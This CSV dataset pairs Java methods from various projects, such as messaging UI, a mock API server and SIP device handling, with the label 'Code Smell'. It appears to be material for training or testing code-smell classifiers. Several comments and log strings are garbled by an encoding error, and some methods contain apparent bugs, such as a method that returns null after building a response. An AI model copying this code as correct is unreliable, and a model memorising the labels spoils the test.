text,label,text_label
"private ResponseEntity<?> getResponseBody(ApiDefinitionMockConfig config,String apiId,String projectId){
  ResponseBody responseBody=null;
  List<MsHeader> responseHeader=null;
  int responseCode=-1;
  String useApiResponseId=null;
  Long delay=null;
  if (config != null) {
    MockResponse mockResponse=JSON.parseObject(new String(config.getResponse()),MockResponse.class);
    if (mockResponse.isUseApiResponse()) {
      useApiResponseId=mockResponse.getApiResponseId();
    }
 else {
      responseCode=mockResponse.getStatusCode();
      responseHeader=mockResponse.getHeaders();
      responseBody=mockResponse.getBody();
      delay=mockResponse.getDelay();
    }
  }
  if (StringUtils.isNotBlank(useApiResponseId) || responseCode == -1) {
    HttpResponse mockSelectResponse=null;
    ApiDefinitionBlob blob=apiDefinitionBlobMapper.selectByPrimaryKey(apiId);
    if (blob != null) {
      List<HttpResponse> responseList=JSON.parseArray(new String(blob.getResponse()),HttpResponse.class);
      HttpResponse defaultHttpResponse=responseList.stream().filter(HttpResponse::isDefaultFlag).findFirst().orElse(null);
      final String useId=useApiResponseId;
      mockSelectResponse=responseList.stream().filter(responseItem -> StringUtils.equals(responseItem.getId(),useId)).findFirst().orElse(defaultHttpResponse);
    }
    if (mockSelectResponse != null) {
      responseCode=Integer.parseInt(mockSelectResponse.getStatusCode());
      responseHeader=mockSelectResponse.getHeaders();
      responseBody=mockSelectResponse.getBody();
    }
  }
  HttpHeaders headers=new HttpHeaders();
  if (CollectionUtils.isNotEmpty(responseHeader)) {
    responseHeader.stream().filter(MsHeader::getEnable).forEach(header -> headers.add(header.getKey(),header.getValue()));
  }
  if (responseBody != null) {
    if (delay != null && delay > 0) {
      try {
        Thread.sleep(delay);
      }
 catch (      Exception ignored) {
      }
    }
    boolean isMock=config != null;
    String resourceId=config != null ? config.getId() : apiId;
    return null;
  }
  return requestNotFound();
}",1,Code Smell
"public boolean update(int currentAccount,int dialogsType,long dialogId){
  final AccountInstance account=AccountInstance.getInstance(currentAccount);
  final MessagesController controller=MessagesController.getInstance(currentAccount);
  if (!(controller.folderTags && account.getUserConfig().isPremium())) {
    final boolean wasEmpty=tags.isEmpty();
    tags.clear();
    return !wasEmpty;
  }
  ArrayList<MessagesController.DialogFilter> allFilters=controller.dialogFilters;
  MessagesController.DialogFilter currentFilter=null;
  if (dialogsType == DialogsActivity.DIALOGS_TYPE_FOLDER1) {
    currentFilter=controller.selectedDialogFilter[0];
  }
 else   if (dialogsType == DialogsActivity.DIALOGS_TYPE_FOLDER2) {
    currentFilter=controller.selectedDialogFilter[1];
  }
  filters.clear();
  if (dialogsType == DialogsActivity.DIALOGS_TYPE_DEFAULT || dialogsType == DialogsActivity.DIALOGS_TYPE_FOLDER1 || dialogsType == DialogsActivity.DIALOGS_TYPE_FOLDER2) {
    for (int i=0; i < allFilters.size(); ++i) {
      MessagesController.DialogFilter filter=allFilters.get(i);
      if (filter == null || filter == currentFilter || filter.color < 0)       continue;
      if (filter.includesDialog(account,dialogId)) {
        filters.add(filter);
      }
    }
  }
  boolean changed=false;
  for (int i=0; i < tags.size(); ++i) {
    Tag tag=tags.get(i);
    MessagesController.DialogFilter filter=null;
    for (int j=0; j < filters.size(); ++j) {
      if (filters.get(j).id == tag.filterId) {
        filter=filters.get(j);
        break;
      }
    }
    if (filter == null) {
      changed=true;
      tags.remove(i);
      i--;
    }
 else     if (filter.color != tag.colorId || filter.name != null && tag.layout != null && filter.name.length() != tag.layout.getText().length()) {
      tags.set(i,Tag.fromFilter(currentAccount,filter));
      changed=true;
    }
  }
  for (int i=0; i < filters.size(); ++i) {
    MessagesController.DialogFilter filter=filters.get(i);
    Tag tag=null;
    for (int j=0; j < tags.size(); ++j) {
      if (tags.get(j).filterId == filter.id) {
        tag=tags.get(j);
        break;
      }
    }
    if (tag == null) {
      changed=true;
      tags.add(i,Tag.fromFilter(currentAccount,filter));
    }
  }
  filters.clear();
  return changed;
}",1,Code Smell
"public boolean isGlobalSearch(int i){
  if (!searchWas) {
    return false;
  }
  if (!searchResultHashtags.isEmpty()) {
    return false;
  }
  if (isRecentSearchDisplayed()) {
    int offset=(hasHints() ? 1 : 0);
    ArrayList<RecentSearchObject> recent=searchWas ? filtered2RecentSearchObjects : filteredRecentSearchObjects;
    if (i > offset && i - 1 - offset < recent.size()) {
      return false;
    }
 else {
      i-=getRecentItemsCount();
    }
  }
  ArrayList<TLObject> globalSearch=searchAdapterHelper.getGlobalSearch();
  ArrayList<TLObject> localServerSearch=searchAdapterHelper.getLocalServerSearch();
  int localCount=searchResult.size();
  int localServerCount=localServerSearch.size();
  int phoneCount=searchAdapterHelper.getPhoneSearch().size();
  if (phoneCount > 3 && phoneCollapsed) {
    phoneCount=3;
  }
  int globalCount=globalSearch.isEmpty() ? 0 : globalSearch.size() + 1;
  if (globalCount > 4 && globalSearchCollapsed) {
    globalCount=4;
  }
  int contactsCount=searchContacts.size();
  if (contactsCount > 0) {
    if (i >= 0 && i < contactsCount) {
      return false;
    }
    i-=contactsCount + 1;
  }
  if (localCount + localServerCount > 0 && (getRecentItemsCount() > 0 || !searchTopics.isEmpty())) {
    if (i == 0) {
      return false;
    }
    i--;
  }
  if (i >= 0 && i < localCount) {
    return false;
  }
  i-=localCount;
  if (i >= 0 && i < localServerCount) {
    return false;
  }
  i-=localServerCount;
  if (i > 0 && i < phoneCount) {
    return false;
  }
  i-=phoneCount;
  if (i > 0 && i < globalCount) {
    return true;
  }
  i-=globalCount;
  int localMessagesCount=searchForumResultMessages.isEmpty() ? 0 : searchForumResultMessages.size() + 1;
  if (i > 0 && i < localMessagesCount) {
    return false;
  }
  i-=localMessagesCount;
  int messagesCount=searchResultMessages.isEmpty() ? 0 : searchResultMessages.size() + 1;
  if (i > 0 && i < messagesCount) {
    return false;
  }
  return false;
}",1,Code Smell
"/** 
 * The l2 or euclidean distance between this vector and the other vector.
 * @param other The other vector.
 * @return The euclidean distance between them.
 */
@Override public double euclideanDistance(SGDVector other){
  if (other.size() != elements.length) {
    throw new IllegalArgumentException(""Can't measure distance of two vectors of different lengths, this = "" + elements.length + "", other = ""+ other.size());
  }
 else   if (other instanceof DenseVector) {
    double score=0.0;
    for (int i=0; i < elements.length; i++) {
      double tmp=get(i) - other.get(i);
      score+=tmp * tmp;
    }
    return Math.sqrt(score);
  }
 else   if (other instanceof SparseVector) {
    double score=0.0;
    int i=0;
    Iterator<VectorTuple> otherItr=other.iterator();
    VectorTuple otherTuple;
    while (i < elements.length && otherItr.hasNext()) {
      otherTuple=otherItr.next();
      while (i < elements.length && (i < otherTuple.index)) {
        double value=get(i);
        score+=value * value;
        i++;
      }
      if (i == otherTuple.index) {
        double tmp=get(i) - otherTuple.value;
        score+=tmp * tmp;
        i++;
      }
    }
    for (; i < elements.length; i++) {
      double value=get(i);
      score+=value * value;
    }
    return Math.sqrt(score);
  }
 else {
    throw new IllegalArgumentException(""Unknown vector subclass "" + other.getClass().getCanonicalName() + "" for input"");
  }
}",1,Code Smell
"@Override public boolean onTouchEvent(MotionEvent ev){
  if (ev.getAction() == MotionEvent.ACTION_DOWN && ev.getEdgeFlags() != 0) {
    return false;
  }
  if (mVelocityTracker == null) {
    mVelocityTracker=VelocityTracker.obtain();
  }
  mVelocityTracker.addMovement(ev);
  final int action=ev.getAction();
switch (action & MotionEvent.ACTION_MASK) {
case MotionEvent.ACTION_DOWN:
{
      final float x=ev.getX();
      final float y=ev.getY();
      if (!(mIsBeingDragged=inChild((int)x,(int)y))) {
        return false;
      }
      if (!mScroller.isFinished()) {
        mScroller.abortAnimation();
      }
      mLastMotionY=y;
      mLastMotionX=x;
      mActivePointerId=ev.getPointerId(0);
      break;
    }
case MotionEvent.ACTION_MOVE:
  if (mIsBeingDragged) {
    final int activePointerIndex=ev.findPointerIndex(mActivePointerId);
    final float y=ev.getY(activePointerIndex);
    final int deltaY=(int)(mLastMotionY - y);
    mLastMotionY=y;
    final float x=ev.getX(activePointerIndex);
    final int deltaX=(int)(mLastMotionX - x);
    mLastMotionX=x;
    scrollBy(deltaX,deltaY);
  }
break;
case MotionEvent.ACTION_UP:
if (mIsBeingDragged) {
if (mFlingEnabled) {
  final VelocityTracker velocityTracker=mVelocityTracker;
  velocityTracker.computeCurrentVelocity(1000,mMaximumVelocity);
  int initialVelocitx=(int)velocityTracker.getXVelocity();
  int initialVelocity=(int)velocityTracker.getYVelocity();
  if (getChildCount() > 0) {
    if (Math.abs(initialVelocitx) > initialVelocitx || Math.abs(initialVelocity) > mMinimumVelocity) {
      fling(-initialVelocitx,-initialVelocity);
    }
  }
}
mActivePointerId=INVALID_POINTER;
mIsBeingDragged=false;
if (mVelocityTracker != null) {
  mVelocityTracker.recycle();
  mVelocityTracker=null;
}
}
break;
case MotionEvent.ACTION_CANCEL:
if (mIsBeingDragged && getChildCount() > 0) {
mActivePointerId=INVALID_POINTER;
mIsBeingDragged=false;
if (mVelocityTracker != null) {
mVelocityTracker.recycle();
mVelocityTracker=null;
}
}
break;
case MotionEvent.ACTION_POINTER_UP:
onSecondaryPointerUp(ev);
break;
}
return true;
}",1,Code Smell
"/** 
 * 鍚堝苟妯℃澘銆�
 * @param templates          鍘熸ā鏉挎暟缁勶紝鍏佽涓簕@code null}
 * @param resourceName
 * @param resourceIsTemplate
 * @return
 */
protected String[] mergeTemplates(String[] templates,String resourceName,boolean resourceIsTemplate){
  return mergeTemplates(templates,new String[]{resourceName},new boolean[]{resourceIsTemplate});
}
/** 
 * 鍚堝苟妯℃澘銆�
 * @param templates           鍘熸ā鏉挎暟缁勶紝鍏佽涓簕@code null}
 * @param resourceNames
 * @param resourceIsTemplates
 * @return
 */
protected String[] mergeTemplates(String[] templates,String[] resourceNames,boolean[] resourceIsTemplates){
  List<String> ts=new ArrayList<>();
  if (templates != null)   ts.addAll(Arrays.asList(templates));
  boolean autoFirstTemplate=ts.isEmpty();
  for (int i=0; i < resourceNames.length; i++) {
    boolean contains=ts.contains(resourceNames[i]);
    if (resourceIsTemplates[i] && !contains)     ts.add(resourceNames[i]);
 else     if (!resourceIsTemplates[i] && contains)     ts.remove(resourceNames[i]);
  }
  if (autoFirstTemplate) {
    int firstTempalteIdx=-1;
    for (int i=0; i < ts.size(); i++) {
      String tn=ts.get(i);
      if (tn.equalsIgnoreCase(""index.html"") || tn.equalsIgnoreCase(""index.htm"")) {
        firstTempalteIdx=i;
        break;
      }
    }
    if (firstTempalteIdx > 0) {
      String tn=ts.remove(firstTempalteIdx);
      ts.add(0,tn);
    }
  }
  return ts.toArray(new String[ts.size()]);
}",1,Code Smell
"public String getMessageNameString(){
  if (message == null) {
    return null;
  }
  TLRPC.User user;
  TLRPC.User fromUser=null;
  TLRPC.Chat fromChat=null;
  long fromId=message.getFromChatId();
  final long selfId=UserConfig.getInstance(currentAccount).getClientUserId();
  if (!isSavedDialog && currentDialogId == selfId) {
    long savedDialogId=message.getSavedDialogId();
    if (savedDialogId == selfId) {
      return null;
    }
 else     if (savedDialogId != UserObject.ANONYMOUS) {
      if (message.messageOwner != null && message.messageOwner.fwd_from != null) {
        long fwdId=DialogObject.getPeerDialogId(message.messageOwner.fwd_from.saved_from_id);
        if (fwdId == 0) {
          fwdId=DialogObject.getPeerDialogId(message.messageOwner.fwd_from.from_id);
        }
        if (fwdId > 0 && fwdId != savedDialogId) {
          return null;
        }
      }
      fromId=savedDialogId;
    }
  }
  if (isSavedDialog && message.messageOwner != null && message.messageOwner.fwd_from != null) {
    fromId=DialogObject.getPeerDialogId(message.messageOwner.fwd_from.saved_from_id);
    if (fromId == 0) {
      fromId=DialogObject.getPeerDialogId(message.messageOwner.fwd_from.from_id);
    }
  }
  if (DialogObject.isUserDialog(fromId)) {
    fromUser=MessagesController.getInstance(currentAccount).getUser(fromId);
  }
 else {
    fromChat=MessagesController.getInstance(currentAccount).getChat(-fromId);
  }
  if (currentDialogId == selfId) {
    if (fromUser != null) {
      return UserObject.getFirstName(fromUser).replace(""\n"","""");
    }
 else     if (fromChat != null) {
      return fromChat.title.replace(""\n"","""");
    }
    return null;
  }
 else   if (message.isOutOwner()) {
    return LocaleController.getString(""FromYou"",R.string.FromYou);
  }
 else   if (!isSavedDialog && message != null && message.messageOwner != null && message.messageOwner.from_id instanceof TLRPC.TL_peerUser && (user=MessagesController.getInstance(currentAccount).getUser(message.messageOwner.from_id.user_id)) != null) {
    return UserObject.getFirstName(user).replace(""\n"","""");
  }
 else   if (fromUser != null) {
    if (useForceThreeLines || SharedConfig.useThreeLinesLayout) {
      if (UserObject.isDeleted(fromUser)) {
        return LocaleController.getString(""HiddenName"",R.string.HiddenName);
      }
 else {
        return ContactsController.formatName(fromUser.first_name,fromUser.last_name).replace(""\n"","""");
      }
    }
 else {
      return UserObject.getFirstName(fromUser).replace(""\n"","""");
    }
  }
 else   if (fromChat != null && fromChat.title != null) {
    return fromChat.title.replace(""\n"","""");
  }
 else {
    return LocaleController.getString(""HiddenName"",R.string.HiddenName);
  }
}",1,Code Smell
"@Override public boolean onTouchEvent(MotionEvent ev){
  if (disableScrolling) {
    return false;
  }
  if (profileActivity.getParentLayout() != null && !profileActivity.getParentLayout().checkTransitionAnimation() && !checkTabsAnimationInProgress() && !isInPinchToZoomTouchMode) {
    if (ev != null) {
      if (velocityTracker == null) {
        velocityTracker=VelocityTracker.obtain();
      }
      velocityTracker.addMovement(ev);
      if (fwdRestrictedHint != null) {
        fwdRestrictedHint.hide();
      }
    }
    if (ev != null && ev.getAction() == MotionEvent.ACTION_DOWN && !startedTracking && !maybeStartTracking && ev.getY() >= dp(48)) {
      startedTrackingPointerId=ev.getPointerId(0);
      maybeStartTracking=true;
      startedTrackingX=(int)ev.getX();
      startedTrackingY=(int)ev.getY();
      velocityTracker.clear();
    }
 else     if (ev != null && ev.getAction() == MotionEvent.ACTION_MOVE && ev.getPointerId(0) == startedTrackingPointerId) {
      int dx=(int)(ev.getX() - startedTrackingX);
      int dy=Math.abs((int)ev.getY() - startedTrackingY);
      if (startedTracking && (animatingForward && dx > 0 || !animatingForward && dx < 0)) {
        if (!prepareForMoving(ev,dx < 0)) {
          maybeStartTracking=true;
          startedTracking=false;
          onTabScroll(false);
          mediaPages[0].setTranslationX(0);
          mediaPages[1].setTranslationX(animatingForward ? mediaPages[0].getMeasuredWidth() : -mediaPages[0].getMeasuredWidth());
          scrollSlidingTextTabStrip.selectTabWithId(mediaPages[1].selectedType,0);
          onTabProgress(getTabProgress());
        }
      }
      if (maybeStartTracking && !startedTracking) {
        float touchSlop=AndroidUtilities.getPixelsInCM(0.3f,true);
        if (Math.abs(dx) >= touchSlop && Math.abs(dx) > dy) {
          prepareForMoving(ev,dx < 0);
        }
      }
 else       if (startedTracking) {
        mediaPages[0].setTranslationX(dx);
        if (animatingForward) {
          mediaPages[1].setTranslationX(mediaPages[0].getMeasuredWidth() + dx);
        }
 else {
          mediaPages[1].setTranslationX(dx - mediaPages[0].getMeasuredWidth());
        }
        float scrollProgress=Math.abs(dx) / (float)mediaPages[0].getMeasuredWidth();
        if (!canShowSearchItem()) {
          searchAlpha=0;
        }
 else {
          searchAlpha=getSearchAlpha(scrollProgress);
          updateSearchItemIcon(scrollProgress);
          optionsAlpha=getPhotoVideoOptionsAlpha(scrollProgress);
          photoVideoOptionsItem.setVisibility((optionsAlpha == 0 || !canShowSearchItem() || isArchivedOnlyStoriesView()) ? INVISIBLE : View.VISIBLE);
        }
        updateOptionsSearch();
        scrollSlidingTextTabStrip.selectTabWithId(mediaPages[1].selectedType,scrollProgress);
        onTabProgress(getTabProgress());
        onSelectedTabChanged();
      }
    }
 else     if (ev == null || ev.getPointerId(0) == startedTrackingPointerId && (ev.getAction() == MotionEvent.ACTION_CANCEL || ev.getAction() == MotionEvent.ACTION_UP || ev.getAction() == MotionEvent.ACTION_POINTER_UP)) {
      stopScroll(ev);
    }
    return startedTracking;
  }
  return false;
}",1,Code Smell
"/** 
 * Get producer by topic name: i. if the topic is judged to be an illegal topic, return null; ii. if it is not an illegal topic or the status has expired, check: a. if the topic has been published before, return the corresponding producer directly; b. if the topic is not in the published list, perform the topic's publish action. If the topic is thrown exception during the publishing process, set the topic to an illegal topic
 * @param topicName  the topic name
 * @return  the producerif topic is illegal, return null
 * @throws TubeClientException
 */
public MessageProducer getProducer(String topicName) throws TubeClientException {
  AtomicLong fbdTime=FROZEN_TOPIC_MAP.get(topicName);
  if (fbdTime != null && fbdTime.get() > System.currentTimeMillis()) {
    return null;
  }
  MessageProducer tmpProducer=producerMap.get(topicName);
  if (tmpProducer != null) {
    if (fbdTime != null) {
      FROZEN_TOPIC_MAP.remove(topicName);
    }
    return tmpProducer;
  }
synchronized (lastPubTopicCnt) {
    fbdTime=FROZEN_TOPIC_MAP.get(topicName);
    if (fbdTime != null && fbdTime.get() > System.currentTimeMillis()) {
      return null;
    }
    if (lastProducer == null || lastPubTopicCnt.get() >= clusterConfig.getMaxTopicsEachProducerHold()) {
      lastProducer=sessionFactory.createProducer();
      lastPubTopicCnt.set(0);
    }
    try {
      lastProducer.publish(topicName);
    }
 catch (    Throwable e) {
      fbdTime=FROZEN_TOPIC_MAP.get(topicName);
      if (fbdTime == null) {
        AtomicLong tmpFbdTime=new AtomicLong();
        fbdTime=FROZEN_TOPIC_MAP.putIfAbsent(topicName,tmpFbdTime);
        if (fbdTime == null) {
          fbdTime=tmpFbdTime;
        }
      }
      fbdTime.set(System.currentTimeMillis() + PUBLISH_FAILURE_WAIT);
      logger.warn(""Throw exception while publish topic="" + topicName + "", exception is ""+ e.getMessage());
      return null;
    }
    producerMap.put(topicName,lastProducer);
    lastPubTopicCnt.incrementAndGet();
    return lastProducer;
  }
}",1,Code Smell
"public static boolean testWriteNumberValueToTime(Class propertyType,Bb bb){
  if (propertyType == LocalDateTime.class) {
    Object v=bb.getValue();
    if (v instanceof Long || v instanceof Integer) {
      if (Long.valueOf(v.toString()) == 0) {
        bb.setValue(null);
      }
 else {
        LocalDateTime time=Instant.ofEpochMilli(toLongValue(v)).atZone(ZoneId.systemDefault()).toLocalDateTime();
        bb.setValue(time);
      }
    }
    return true;
  }
 else   if (propertyType == Date.class) {
    Object v=bb.getValue();
    if (v instanceof Long || v instanceof Integer) {
      if (Long.valueOf(v.toString()) == 0) {
        bb.setValue(null);
      }
 else {
        bb.setValue(new Date(toLongValue(v)));
      }
    }
    return true;
  }
 else   if (propertyType == Timestamp.class) {
    Object v=bb.getValue();
    if (v instanceof Long || v instanceof Integer) {
      if (Long.valueOf(v.toString()) == 0) {
        bb.setValue(null);
      }
 else {
        bb.setValue(new Timestamp(toLongValue(v)));
      }
    }
    return true;
  }
 else   if (propertyType == LocalDate.class) {
    Object v=bb.getValue();
    if (v instanceof Long || v instanceof Integer) {
      if (Long.valueOf(v.toString()) == 0) {
        bb.setValue(null);
      }
 else {
        LocalDate date=Instant.ofEpochMilli(toLongValue(v)).atZone(ZoneId.systemDefault()).toLocalDate();
        bb.setValue(date);
      }
    }
    return true;
  }
  return false;
}",1,Code Smell
"private static Object[] buildArgs(Method method){
  ArrayList<Object> result=new ArrayList<>();
  for (  Class<?> c : method.getParameterTypes()) {
    if (c == int.class) {
      result.add(0);
    }
 else     if (c == long.class) {
      result.add(0L);
    }
 else     if (c == float.class) {
      result.add(0f);
    }
 else     if (c == double.class) {
      result.add(0d);
    }
 else     if (c == char.class) {
      result.add((char)0);
    }
 else     if (c == byte.class) {
      result.add((byte)0);
    }
 else     if (c == Uri.class) {
      result.add(Uri.fromParts(""example"",""example"",null));
    }
 else     if (c == ContentValues.class) {
      result.add(new ContentValues());
    }
 else     if (c == ArrayList.class) {
      result.add(new ArrayList<>());
    }
 else     if (BuildUtils.atLeast31() && c == AttributionSource.class) {
      result.add(new AttributionSource.Builder(0).setPackageName(""example"").setAttributionTag(""example"").build());
    }
 else {
      result.add(null);
    }
  }
  return result.toArray();
}",1,Code Smell
"@Override public void handForDevice(RequestEvent evt,Device device,Element element){
  if (device == null) {
    return;
  }
  SIPRequest request=(SIPRequest)evt.getRequest();
  logger.info(""[鏀跺埌蹇冭烦] device: {}, callId: {}"",device.getDeviceId(),request.getCallIdHeader().getCallId());
  try {
    responseAck(request,Response.OK);
  }
 catch (  SipException|InvalidArgumentException|ParseException e) {
    logger.error(""[鍛戒护鍙戦佸け璐 蹇冭烦鍥炲: {}"",e.getMessage());
  }
  if (!ObjectUtils.isEmpty(device.getKeepaliveTime()) && DateUtil.getDifferenceForNow(device.getKeepaliveTime()) <= 3000L) {
    logger.info(""[鏀跺埌蹇冭烦] 蹇冭烦鍙戦佽繃浜庨绻侊紝宸插拷鐣 device: {}, callId: {}"",device.getDeviceId(),request.getCallIdHeader().getCallId());
    return;
  }
  RemoteAddressInfo remoteAddressInfo=SipUtils.getRemoteAddressFromRequest(request,userSetting.getSipUseSourceIpAsRemoteAddress());
  if (!device.getIp().equalsIgnoreCase(remoteAddressInfo.getIp()) || device.getPort() != remoteAddressInfo.getPort()) {
    logger.info(""[鏀跺埌蹇冭烦] 璁惧{}鍦板潃鍙樺寲, 杩滅▼鍦板潃涓: {}:{}"",device.getDeviceId(),remoteAddressInfo.getIp(),remoteAddressInfo.getPort());
    device.setPort(remoteAddressInfo.getPort());
    device.setHostAddress(remoteAddressInfo.getIp().concat("":"").concat(String.valueOf(remoteAddressInfo.getPort())));
    device.setIp(remoteAddressInfo.getIp());
    if (device.getSubscribeCycleForCatalog() > 0) {
      deviceService.removeCatalogSubscribe(device,result -> {
        deviceService.addCatalogSubscribe(device);
      }
);
    }
  }
  if (device.getKeepaliveTime() == null) {
    device.setKeepaliveIntervalTime(60);
  }
 else {
    long lastTime=DateUtil.yyyy_MM_dd_HH_mm_ssToTimestamp(device.getKeepaliveTime());
    if (System.currentTimeMillis() / 1000 - lastTime > 10) {
      device.setKeepaliveIntervalTime(Long.valueOf(System.currentTimeMillis() / 1000 - lastTime).intValue());
    }
  }
  device.setKeepaliveTime(DateUtil.getNow());
  if (device.isOnLine()) {
    deviceService.updateDevice(device);
  }
 else {
    if (!deviceService.expire(device)) {
      device.setOnLine(false);
      deviceService.online(device,null);
    }
  }
  String registerExpireTaskKey=VideoManagerConstants.REGISTER_EXPIRE_TASK_KEY_PREFIX + device.getDeviceId();
  dynamicTask.startDelay(registerExpireTaskKey,() -> deviceService.offline(device.getDeviceId(),""涓夋蹇冭烦澶辫触""),device.getKeepaliveIntervalTime() * 1000 * 3);
}",1,Code Smell
"static List<QueryWrapper> getChildQueryWrapper(QueryCondition condition){
  List<QueryWrapper> list=null;
  while (condition != null) {
    if (condition.checkEffective()) {
      if (condition instanceof Brackets) {
        List<QueryWrapper> childQueryWrapper=getChildQueryWrapper(((Brackets)condition).getChildCondition());
        if (!childQueryWrapper.isEmpty()) {
          if (list == null) {
            list=new ArrayList<>();
          }
          list.addAll(childQueryWrapper);
        }
      }
 else {
        Object value=condition.getValue();
        if (value instanceof QueryWrapper) {
          if (list == null) {
            list=new ArrayList<>();
          }
          list.add((QueryWrapper)value);
          list.addAll(((QueryWrapper)value).getChildSelect());
        }
 else         if (value != null && value.getClass().isArray()) {
          for (int i=0; i < Array.getLength(value); i++) {
            Object arrayValue=Array.get(value,i);
            if (arrayValue instanceof QueryWrapper) {
              if (list == null) {
                list=new ArrayList<>();
              }
              list.add((QueryWrapper)arrayValue);
              list.addAll(((QueryWrapper)arrayValue).getChildSelect());
            }
          }
        }
      }
    }
    condition=condition.next;
  }
  return list == null ? Collections.emptyList() : list;
}",1,Code Smell
"private List<InputStream> setRequestFormParameter(SpiderNode node,HttpRequest request,List<Map<String,String>> parameters,SpiderContext context,Map<String,Object> variables){
  List<InputStream> streams=new ArrayList<>();
  if (parameters != null) {
    for (    Map<String,String> nameValue : parameters) {
      Object value;
      String parameterName=nameValue.get(PARAMETER_FORM_NAME);
      if (StringUtils.isNotBlank(parameterName)) {
        String parameterValue=nameValue.get(PARAMETER_FORM_VALUE);
        String parameterType=nameValue.get(PARAMETER_FORM_TYPE);
        String parameterFilename=nameValue.get(PARAMETER_FORM_FILENAME);
        boolean hasFile=""file"".equals(parameterType);
        try {
          value=ExpressionUtils.execute(parameterValue,variables);
          if (hasFile) {
            InputStream stream=null;
            if (value instanceof byte[]) {
              stream=new ByteArrayInputStream((byte[])value);
            }
 else             if (value instanceof String) {
              stream=new ByteArrayInputStream(((String)value).getBytes());
            }
 else             if (value instanceof InputStream) {
              stream=(InputStream)value;
            }
            if (stream != null) {
              streams.add(stream);
              request.data(parameterName,parameterFilename,stream);
              context.pause(node.getNodeId(),""request-body"",parameterName,parameterFilename);
              logger.info(""璁剧疆璇锋眰鍙傛暟锛歿}={}"",parameterName,parameterFilename);
            }
 else {
              logger.warn(""璁剧疆璇锋眰鍙傛暟锛歿}澶辫触锛屾棤浜岃繘鍒跺唴瀹"",parameterName);
            }
          }
 else {
            request.data(parameterName,value);
            context.pause(node.getNodeId(),""request-body"",parameterName,value);
            logger.info(""璁剧疆璇锋眰鍙傛暟锛歿}={}"",parameterName,value);
          }
        }
 catch (        Exception e) {
          logger.error(""璁剧疆璇锋眰鍙傛暟锛歿}鍑洪敊,寮傚父淇℃伅:{}"",parameterName,e);
        }
      }
    }
  }
  return streams;
}
",1,Code Smell
